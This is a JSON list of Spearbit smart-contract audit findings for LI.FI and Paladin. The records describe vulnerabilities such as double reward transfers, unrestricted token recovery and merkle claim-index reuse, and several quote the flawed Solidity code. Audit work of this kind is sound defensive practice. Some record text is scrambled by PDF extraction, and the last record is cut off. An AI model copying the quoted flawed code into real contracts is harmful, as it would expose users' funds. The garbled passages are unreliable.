[{"title": "Inconsistent use of validateDestinationCallFlag()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "Highlighted code can be replaced with a call to validateDestinationCallFlag() function as done in other Facets.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Inconsistent utilization of the isNativeAsset function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The isNativeAsset function is designed to distinguish native assets from other tokens within facet- based smart contract implementations. However, it has been observed that the usage of the isNativeAsset function is not consistent across various facets. Ensuring uniform application of this function is crucial for maintaining the accuracy and reliability of the asset identification and processing within the facets.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Unused events/errors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The contracts contain several events and error messages that are not used anywhere in the contract code. These unused events and errors add unnecessary code to the contract, increasing its size.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Make bridge parameters dynamic by keeping them as a parameter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The current implementation has some bridge parameters hardcoded within the smart contract. This approach limits the flexibility of the contract and may cause issues in the future when upgrades or changes to the bridge parameters are required. It would be better to keep the bridge parameters as a parameter to make them dynamic and easily changeable in the future. HopFacetOptimized.sol => Relayer & RelayerFee MakerTeleportFacet.sol's => Operator person (or specified third party) responsible for initiating minting process on destination domain by providing (in the fast path) Oracle attestations.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Incorrect comment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The highlighted comment incorrectly refers USDC address as DAI address.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Redundant console log", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "The contract includes Console.sol from test file, which is only used for debugging purposes. In- cluding it in the final version of the contract can increase the contract size and consume more gas, making it more expensive to deploy and execute.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "SquidFacet doesn't revert for incorrect routerType", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf", "body": "If _squidData.routeType passed by the user doesn't match BridgeCall, CallBridge, or Call- BridgeCall, SquidFacet just takes the funds from the user and returns without calling the bridge. This, when the combined with the issue \"Max approval to any address is possible\", lets anyone steal those funds. Note: Solidity enum checks should prevent this issue, but it is safer to do an extra check.", "labels": ["Spearbit", "LIFI-retainer1", "Severity: Informational"]}, {"title": "Verify user has indeed voted", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "If an error is made in the merkle trees (either by accident or on purpose) a user that did not vote (in that period for that gauge) might get rewards assigned to him. Although the Paladin documentation says: \"the Curve DAO contract does not offer a mapping of votes for each Gauge for each Period\", it might still be possible to verify that a user has voted if the account, gauge and period are known. Note: Set to high risk because the likelihood of this happening is medium, but the impact is high.", "labels": ["Spearbit", "Paladin", "Severity: High Risk"]}, {"title": "Tokens could be sent / withdrawn multiple times by accident", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Functions closeQuestPeriod() and closePartOfQuestPeriod() have similar functionality but in- terfere with each other. 1. Suppose you have closed the first quest of a period via closePartOfQuestPeriod(). Now you cannot use closeQuestPeriod() to close the rest of the periods, as closeQuestPeriod() checks the state of the first quest. 2. Suppose you have closed the second quest of a period via closePartOfQuestPeriod(), but closeQuest- Period() continues to work. It will close the second quest again and send the rewards of the second quest to the distributor, again. Also, function closeQuestPeriod() sets the withdrawableAmount value one more time, so the creator can do withdrawUnusedRewards() once more. Although both closeQuestPeriod() and closePartOfQuestPeriod() are authorized, the problems above could occur by accident. Additionally there is a lot of code duplication between closeQuestPeriod() and closePartOfQuestPeriod(), with a high risk of issues with future code changes. 5 function closeQuestPeriod(uint256 period) external isAlive onlyAllowed nonReentrant { ... // We use the 1st QuestPeriod of this period to check it was not Closed uint256[] memory questsForPeriod = questsByPeriod[period]; require( ,! periodsByQuest[questsForPeriod[0]][period].currentState == PeriodState.ACTIVE, // only checks first period \"QuestBoard: Period already closed\" ); ... // no further checks on currentState _questPeriod.withdrawableAmount = .... IERC20(_quest.rewardToken).safeTransfer(distributor, toDistributeAmount); // sends tokens (again) ... } // sets withdrawableAmount (again) function closePartOfQuestPeriod(uint256 period, uint256[] calldata questIDs) external isAlive onlyAllowed nonReentrant { ,! ... _questPeriod.currentState = PeriodState.CLOSED; ... _questPeriod.withdrawableAmount = _questPeriod.rewardAmountPerPeriod - toDistributeAmount; IERC20(_quest.rewardToken).safeTransfer(distributor, toDistributeAmount); ... } Note: Set to high risk because the likelihood of this happening is medium, but the impact is high.", "labels": ["Spearbit", "Paladin", "Severity: High Risk"]}, {"title": "Limit possibilities of recoverERC20()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Function recoverERC20() in contract MultiMerkleDistributor.sol allows the retrieval of all ERC20 tokens from the MultiMerkleDistributor.sol whereas the comment indicates it is only meant to retrieve those tokens that have been sent by mistake. Allowing to retrieve all tokens also enables the retrieval of legitimate ones. This way rewards cannot be collected anymore. It could be seen as allowing a rug pull by the project and should be avoided. In contrast, function recoverERC20() in contract QuestBoard.sol does prevent whitelisted tokens from being re- trieved. Note: The project could also add a merkle tree that allows for the retrieval of legitimate tokens to their own addresses. 6 * @notice Recovers ERC2O tokens sent by mistake to the contract contract MultiMerkleDistributor is Ownable { function recoverERC20(address token, uint256 amount) external onlyOwner returns(bool) { IERC20(token).safeTransfer(owner(), amount); return true; } } contract QuestBoard is Ownable, ReentrancyGuard { function recoverERC20(address token, uint256 amount) external onlyOwner returns(bool) { require(!whitelistedTokens[token], \"QuestBoard: Cannot recover whitelisted token\"); IERC20(token).safeTransfer(owner(), amount); return true; } }", "labels": ["Spearbit", "Paladin", "Severity: Medium Risk"]}, {"title": "Updating QuestBoard in MultiMerkleDistributor.sol will not work", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Updating QuestManager/ QuestBoard in MultiMerkleDistributor.sol will give the following issue: If the newQuestBoard uses the current implementation of QuestBoard.sol, it will start with questId == 0 again, thus attempting to overwrite previous quests. function updateQuestManager(address newQuestBoard) external onlyOwner { questBoard = newQuestBoard; }", "labels": ["Spearbit", "Paladin", "Severity: Medium Risk"]}, {"title": "Old quests can be extended via increaseQuestDuration()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Function increaseQuestDuration() does not check if a quest is already in the past. Extending a quest from the past in duration is probably not useful. It also might require additional calls to closePartOfQuest- Period(). function increaseQuestDuration(...) ... { updatePeriod(); ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... uint256 periodIterator = ((lastPeriod + WEEK) / WEEK) * WEEK; ... for(uint256 i = 0; i < addedDuration;){ ... periodsByQuest[questID][periodIterator]....= ... periodIterator = ((periodIterator + WEEK) / WEEK) * WEEK; unchecked{ ++i; } } ... }", "labels": ["Spearbit", "Paladin", "Severity: Medium Risk"]}, {"title": "Accidental call of addQuest could block contracts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The addQuest() function uses an onlyAllowed access control modifier. This modifier checks if msg.sender is questBoard or owner. However, the QuestBoard.sol contract has a QuestID registration and a token whitelisting mechanism which should be used in combination with addQuest() function. If owner accidentally calls addQuest(), the QuestBoard.sol contract will not be able to call addQuest() for that questID. As soon as createQuest() tries to add that same questID the function will revert, becoming uncallable because nextID still maintains that same value. function createQuest(...) ... { ... uint256 newQuestID = nextID; nextID += 1; ... require(MultiMerkleDistributor(distributor).addQuest(newQuestID, rewardToken), \"QuestBoard: Fail add to Distributor\"); ... ,! } 8 function addQuest(uint256 questID, address token) external onlyAllowed returns(bool) { require(questRewardToken[questID] == address(0), \"MultiMerkle: Quest already listed\"); require(token != address(0), \"MultiMerkle: Incorrect reward token\"); // Add a new Quest using the QuestID, and list the reward token for that Quest questRewardToken[questID] = token; emit NewQuest(questID, token); return true; } Note: Set to medium risk because the likelihood of this happening is low, but the impact is high.", "labels": ["Spearbit", "Paladin", "Severity: Medium Risk"]}, {"title": "Reduce impact of emergencyUpdatequestPeriod()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Function emergencyUpdatequestPeriod() allows the merkle tree to be updated. The merkle tree contains an embedded index parameter which is used to prevent double claims. When the merkleRoot is updated, the layout of indexes in the merkle tree could become different. Example: Suppose the initial merkle tree contains information for: - user A: index=1, account = 0x1234, amount=100 - user B: index=2, account = 0x5689, amount=200 Then user A claims => _setClaimed(..., 1) is set. Now it turns out a mistake is made with the merkle tree, and it should contain: - user B: index=1, account = 0x5689, amount=200 - user C: index=2, account = 0xabcd, amount=300 Now user B will not be able to claim because bit 1 has already been set. Under this situation the following issues can occur:  Someone who has already claimed might be able to claim again.  Someone who has already claimed has too much.  Someone who has already claimed has too little, and cannot longer claim the rest because _setClaimed() has already been set.  someone who has not yet claimed might not be able to claim because _setClaimed() has already been set by another user. Note: Set to medium risk because the likelihood of this happening is low, but the impact is high.", "labels": ["Spearbit", "Paladin", "Severity: Medium Risk"]}, {"title": "Verify the correct merkle tree is used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The MultiMerkleDistributor.sol contract does not verify that the merkle tree belongs to the right quest and period. If the wrong merkle tree is added then the wrong rewards can be claimed. Note: Set to medium risk because the likelihood of this happening is low, but the impact is high.", "labels": ["Spearbit", "Paladin", "Severity: Medium Risk"]}, {"title": "Prevent mixing rewards from different quests and periods", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The MultiMerkleDistributor.sol contract does not verify that the sum of all amounts in the merkle tree are equal to the rewards allocated for that quest and for that period. This could happen if there is a bug in the merkle tree creation script. If the sum of the amounts is too high, then tokens from other quests or other periods could be claimed, which will give problems later on, when claims are done for the other quest/periods. Note: Set to medium risk because the likelihood of this happening is low, but the impact is high.", "labels": ["Spearbit", "Paladin", "Severity: Medium Risk"]}, {"title": "Nonexistent zero address check for newQuestBoard in updateQuestManager function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Nonexistent zero address check for newQuestBoard in updateQuestManager function. Assigning newQuestBoard to a zero address may cause unintended behavior.", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Verify period is always a multiple of week", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The calculations with period assume that period is a multiple of WEEK. However, period is often assigned as a parameter and not verified if it is a multiple of WEEK. This calculation may cause unexpected results. Note: When it is verified that period is a multiple of WEEK, the following calculation can be simplified: - int256 nextPeriod = ((period + WEEK) / WEEK) * WEEK; + int256 nextPeriod = period + WEEK; The following function does not explicitly verify that period is a multiple of WEEK. function closeQuestPeriod(uint256 period) external isAlive onlyAllowed nonReentrant { ... uint256 nextPeriod = ((period + WEEK) / WEEK) * WEEK; ... } function getQuestIdsForPeriod(uint256 period) external view returns(uint256[] memory) { ... } function closePartOfQuestPeriod(uint256 period, uint256[] calldata questIDs) ... { ... } function addMerkleRoot(uint256 questID, uint256 period, bytes32 merkleRoot) ... { ... } function addMultipleMerkleRoot(..., uint256 period, ...) external isAlive onlyAllowed nonReentrant { ... } ,! function claim(..., uint256 period, ...) public { ... } function updateQuestPeriod(uint256 questID, uint256 period, bytes32 merkleRoot) ... { ... } function emergencyUpdatequestPeriod(uint256 questID, uint256 period, bytes32 merkleRoot) ... { ... } function claimQuest(address account, uint256 questID, ClaimParams[] calldata claims) external { ,! ... // also uses period as part of the claims array require(questMerkleRootPerPeriod[claims[i].questID][claims[i].period] != 0, \"MultiMerkle: not updated yet\"); require(!isClaimed(questID, claims[i].period, claims[i].index), \"MultiMerkle: already claimed\"); ... require( MerkleProof.verify(claims[i].merkleProof, questMerkleRootPerPeriod[questID][claims[i].period], ,! node), \"MultiMerkle: Invalid proof\" ); ... _setClaimed(questID, claims[i].period, claims[i].index); ... emit Claimed(questID, claims[i].period, claims[i].index, claims[i].amount, rewardToken, account); ... }", "labels": ["Spearbit", "Paladin", "Severity: Low Risk QuestBoard.sol#L201-L203, QuestBoard.sol#L750-L815,"]}, {"title": "Missing safety check to ensure array length does not underflow and revert", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Several functions use questPeriods[questID][questPeriods[questID].length - 1]. The sec- ond value in the questPeriods mapping is questPeriods[questID].length - 1. It is possible for this function to revert if the case arises where questPeriods[questID].length is 0. Looking at the code this is not likely to occur but it is a valid safety check that covers possible strange edge cases. function _getRemainingDuration(uint256 questID) internal view returns(uint256) { ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... } function increaseQuestDuration(...) ... { ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... } function increaseQuestReward(...) ... { ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... } function increaseQuestObjective(... ) ... { ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... }", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Prevent dual entry point tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Function recoverERC20() in contract QuestBoard.sol only allows the retrieval of non whitelisted tokens. Recently an issue has been found to circumvent these checks, with so called dual entry point tokens. See a description here: compound-tusd-integration-issue-retrospective function recoverERC20(address token, uint256 amount) external onlyOwner returns(bool) { require(!whitelistedTokens[token], \"QuestBoard: Cannot recover whitelisted token\"); IERC20(token).safeTransfer(owner(), amount); return true; } 13", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Limit the creation of quests", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The function getQuestIdsForPeriod() could run out of gas if someone creates an enormous amount of quests. See also: what-is-the-array-size-limit-of-a-returned-array. Note: If this were to happen, the QuestIds can also be retrieved directly from the getter of questsByPeriod(). Note: closeQuestPeriod() has the same problem, but closePartOfQuestPeriod() is a workaround for this. Requiring a minimal amount of tokens to create a quest can limit the number of quests. The minimum number of tokens to pay is: duration * minObjective * minRewardPerVotePerToken[]. The values of duration and minObjective are least 1, but minRewardPerVotePerToken[] could be 0 and even if minRewardPerVotePerToken is non zero but still low, the number of tokes required is neglectable when using tokens with 18 decimals. Requiring a minimum amount of tokens also helps to prevent the creation of spam quests. 14 function getQuestIdsForPeriod(uint256 period) external view returns(uint256[] memory) { return questsByPeriod[period]; // could run out of gas } function createQuest(...) { ... require(duration > 0, \"QuestBoard: Incorrect duration\"); require(objective >= minObjective, \"QuestBoard: Objective too low\"); ... require(rewardPerVote >= minRewardPerVotePerToken[rewardToken], \"QuestBoard: RewardPerVote too low\"); ... vars.rewardPerPeriod = (objective * rewardPerVote) / UNIT; // can be 0 ==> totalRewardAmount can be 0 require((totalRewardAmount * platformFee)/MAX_BPS == feeAmount, \"QuestBoard: feeAmount incorrect\"); // feeAmount can be 0 ... require((vars.rewardPerPeriod * duration) == totalRewardAmount, \"QuestBoard: totalRewardAmount incorrect\"); ... IERC20(rewardToken).safeTransferFrom(vars.creator, address(this), totalRewardAmount); IERC20(rewardToken).safeTransferFrom(vars.creator, questChest, feeAmount); ... ,! ,! ,! ,! } constructor(address _gaugeController, address _chest){ ... minObjective = 1000 * UNIT; // initial value, but can be overwritten ... } function updateMinObjective(uint256 newMinObjective) external onlyOwner { require(newMinObjective > 0, \"QuestBoard: Null value\"); // perhaps set higher minObjective = newMinObjective; } function whitelistToken(address newToken, uint256 minRewardPerVote) public onlyAllowed { // geen isAlive??? ... minRewardPerVotePerToken[newToken] = minRewardPerVote; // no minimum value required ... ,! }", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Non existing states are considered active", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "periods- if a state is checked of a non existing However, ByQuest[questIDs[i]][period] is active. questIDs[i] or a questID that has no quest in that period, then periodsByQuest[questIDs[i]][period] is empty and periodsByQuest[questIDs[i]][period].currentState == 0. closePartOfQuestPeriod() function verifies state the of if As PeriodState.ACTIVE ==0, the stated is considered to be active and the require() doesnt trigger and pro- cessing continues. Luckily as all other values are also 0 (especially _questPeriod.rewardAmountPerPeriod), toDistributeAmount will be 0 and no tokens are sent. However slight future changes in the code might introduce unwanted effects. enum PeriodState { ACTIVE, CLOSED, DISTRIBUTED } // ACTIVE == 0 function closePartOfQuestPeriod(uint256 period, uint256[] calldata questIDs) external isAlive ,! onlyAllowed nonReentrant { ... for(uint256 i = 0; i < length;){ ... require( periodsByQuest[questIDs[i]][period].currentState == PeriodState.ACTIVE, // doesn't work ,! if questIDs[i] & period are empty \"QuestBoard: Period already closed\" );", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Critical changes should use two-step process", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The QuestBoard.sol, QuestTreasureChest.sol and QuestTreasureChest.sol contracts inherit from OpenZeppelins Ownable contract which enables the onlyOwner role to transfer ownership to another address. Its possible that the onlyOwner role mistakenly transfers ownership to the wrong address, resulting in a loss of the onlyOwner role. This is an unwanted situation because the owner role is neccesary for several methods.", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Prevent accidental call of emergencyUpdatequestPeriod()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Functions updateQuestPeriod() and emergencyUpdatequestPeriod() are very similar. However, if function emergencyUpdatequestPeriod() is accidentally used instead of updateQuestPeriod(), then period isnt push()ed to the array questClosedPeriods[]. This means function getClosedPeriodsByQuests() will not be able to retreive all the closed periods. function updateQuestPeriod(uint256 questID, uint256 period, bytes32 merkleRoot) external onlyAllowed returns(bool) { ... questClosedPeriods[questID].push(period); ... questMerkleRootPerPeriod[questID][period] = merkleRoot; ... ,! } function emergencyUpdatequestPeriod(uint256 questID, uint256 period, bytes32 merkleRoot) external onlyOwner returns(bool) { ... // no push() questMerkleRootPerPeriod[questID][period] = merkleRoot; ... ,! }", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Usage of deprecated safeApprove", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "OpenZeppelin safeApprove implementation is deprecated. Reference. Using this deprecated func- tion can lead to unintended reverts and potential locking of funds. SafeERC20.safeApprove() Insecure Behaviour.", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "questID on the NewQuest event should be indexed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The NewQuest event currently does not have questID set to indexed which goes against the pattern set by the other events in the contract where questID is actually indexed.", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Add validation checks on addresses", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Missing validation checks on addresses passed into the constructor functions. Adding these checks on _gaugeController and _chest can prevent costly errors the during deployment of the contract. Also in function claim() and claimQuest() there is no zero check for for account argument.", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Changing public constant variables to non-public can save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Several constants are public and thus have a getter function. called from the outside, therefore it is not necessary to make them public. It is unlikely for these values to be", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Using uint instead of bool to optimize gas usage", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "A bool is more costly than uint256. Because each write action generates an additional SLOAD to read the contents of the slot, change the bits occupied by bool and finally write back. contract BooleanTest { mapping(address => bool) approvedManagers; // Gas Cost : 44144 function approveManager(address newManager) external{ approvedManagers[newManager] = true; } mapping(address => uint256) approvedManagersWithoutBoolean; // Gas Cost : 44069 function approveManagerWithoutBoolean(address newManager) external{ approvedManagersWithoutBoolean[newManager] = 1; } }", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Optimize && operator usage", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The check && consumes more gas than using multiple require statements. Example test can be seen below: //Gas Cost: 22515 function increaseQuestReward(uint256 newRewardPerVote, uint256 addedRewardAmount, uint256 feeAmount) ,! public { require(newRewardPerVote != 0 && addedRewardAmount != 0 && feeAmount != 0, \"QuestBoard: Null ,! amount\"); } //Gas Cost: 22477 function increaseQuestRewardTest(uint256 newRewardPerVote, uint256 addedRewardAmount, uint256 ,! feeAmount) public { require(newRewardPerVote != 0, \"QuestBoard: Null amount\"); require(addedRewardAmount != 0, \"QuestBoard: Null amount\"); require(feeAmount != 0, \"QuestBoard: Null amount\"); } Note : It costs more gas to deploy but it is worth it after X calls. Trade-offs should be considered.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Unnecesary value set to 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Since all default values in solidity are already 0 it riod.rewardAmountDistributed = 0; here as it should already be 0. is unnecessary to include _questPe-", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Optimize unsigned integer comparison", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Check != 0 costs less gas compared to > 0 for unsigned integers in require statements with the optimizer enabled. While it may seem that > 0 is cheaper than !=0 this is only true without the optimizer being enabled and outside a require statement. If the optimizer is enabled at 10k and it is in a require statement, it would be more gas efficient.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Use memory instead of storage in closeQuestPeriod() and closePartOfQuestPeriod()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "In functions closeQuestPeriod() and closePartOfQuestPeriod() a storage pointer _quest is set to quests[questsForPeriod[i]]. This is normally used when write access to the location is need. Nevertheless _quest is read only, to a copy of quests[questsForPeriod[i]] is also sufficient. This can save some gas. function closeQuestPeriod(uint256 period) external isAlive onlyAllowed nonReentrant { ... Quest storage _quest = quests[questsForPeriod[i]]; ... gaugeController.checkpoint_gauge(_quest.gauge); // read only access of _quest ... uint256 periodBias = gaugeController.points_weight(_quest.gauge, nextPeriod).bias; // read only access of _quest ... IERC20(_quest.rewardToken).safeTransfer(distributor, toDistributeAmount); // read only access of _quest ... ,! ,! } function closePartOfQuestPeriod(uint256 period, uint256[] calldata questIDs) external isAlive onlyAllowed nonReentrant { ... Quest storage _quest = quests[questIDs[i]]; ... gaugeController.checkpoint_gauge(_quest.gauge); // read only access of _quest ... uint256 periodBias = gaugeController.points_weight(_quest.gauge, nextPeriod).bias; // read only access of _quest ... IERC20(_quest.rewardToken).safeTransfer(distributor, toDistributeAmount); // read only access of _quest ... ,! ,! ,! }", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Revert string size optimization", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Shortening revert strings to fit in 32 bytes will decrease deploy time gas and will decrease runtime gas when the revert condition has been met. Revert strings using more than 32 bytes require at least one additional mstore, along with additional operations for computing memory offset.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Optimize withdrawUnusedRewards() and emergencyWithdraw() with pointers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "ByQuest[questID][_questPeriods[i]] several times. pointer to read and update values. This will save gas and also make the code more readable. periods- It is possible to set a pointer to this record and use that withdrawUnusedRewards() emergencyWithdraw() Functions and use function withdrawUnusedRewards(uint256 questID, address recipient) external isAlive nonReentrant { ... if(periodsByQuest[questID][_questPeriods[i]].currentState == PeriodState.ACTIVE) { ... } ... uint256 withdrawableForPeriod = periodsByQuest[questID][_questPeriods[i]].withdrawableAmount; ... if(withdrawableForPeriod > 0){ ... periodsByQuest[questID][_questPeriods[i]].withdrawableAmount = 0; } ... } function emergencyWithdraw(uint256 questID, address recipient) external nonReentrant { ... if(periodsByQuest[questID][_questPeriods[i]].currentState != PeriodState.ACTIVE){ uint256 withdrawableForPeriod = periodsByQuest[questID][_questPeriods[i]].withdrawableAmount; ... if(withdrawableForPeriod > 0){ ... periodsByQuest[questID][_questPeriods[i]].withdrawableAmount = 0; } } else { .. totalWithdraw += periodsByQuest[questID][_questPeriods[i]].rewardAmountPerPeriod; periodsByQuest[questID][_questPeriods[i]].rewardAmountPerPeriod = 0; } ... }", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Needless to initialize variables with default values", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "uint256 variables are initialized to a default value of 0 per Solidity docs. Setting a variable to the default value is unnecessary.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Optimize the calculation of the currentPeriod", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The retrieval of currentPeriod is relatively gas expensive because it requires an SLOAD instruction (100 gas) every time. Calculating (block.timestamp / WEEK) * WEEK; is cheaper (TIMESTAMP: 2 gas, MUL: 5 gas, DIV: 5 gas). Refer to evm.codes for more information. Additionally, there is a risk that the call to updatePeriod() is forgotten although it does not happen in the current code. function updatePeriod() public { if (block.timestamp >= currentPeriod + WEEK) { currentPeriod = (block.timestamp / WEEK) * WEEK; } } Note: it is also possible to do all calculations with (block.timestamp / WEEK) instead of (block.timestamp / WEEK) * WEEK, but as the Paladin project has indicated:\"\" This currentPeriod is a timestamp, showing the start date of the current period, and based from the Curve system (because we want the same timestamp they have in the GaugeController).\"", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Change memory to calldata", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "For the function parameters, it is often more optimal to have the reference location to be calldata instead of memory. Changing bytes to calldata will decrease gas usage. OpenZeppelin Pull Request", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Caching array length at the beginning of function can save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Caching array length at the beginning of the function can save gas in the several locations. function multiClaim(address account, ClaimParams[] calldata claims) external { require(claims.length != 0, \"MultiMerkle: empty parameters\"); uint256 length = claims.length; // if this is done before the require, the require can use \"length\" ... }", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Check amount is greater than 0 to avoid calling safeTransfer() unnecessarily", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "A check should be added to make sure amount is greater than 0 to avoid calling safeTransfer() unnecessarily.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Unchecked{++i} is more efficient than i++", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The function getAllQuestPeriodsForQuestId uses i++ which costs more gas than ++i, especially in a loop. Also, the createQuest function uses nextID += 1 which costs more gas than ++nextID. Finally the initialization of i = 0 can be skipped, as 0 is the default value.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Could replace claims[i].questID with questID", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Could replace claims[i].questID with questID (as they are equal due to the check above)", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Change function visibility from public to external", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The function updateRewardToken of the QuestBoard contract could be set external to save gas and improve code quality.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Functions isClaimed() and _setClaimed() can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The functions isClaimed() and _setClaimed() of the contract MultiMerkleDistributor can be optimized to save gas. See OZ BitMaps for inspiration.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Missing events for owner only functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Several key actions are defined without event declarations. Owner only functions that change critical parameters can emit events to record these changes on-chain for off-chain monitors/tools/interfaces.", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Use 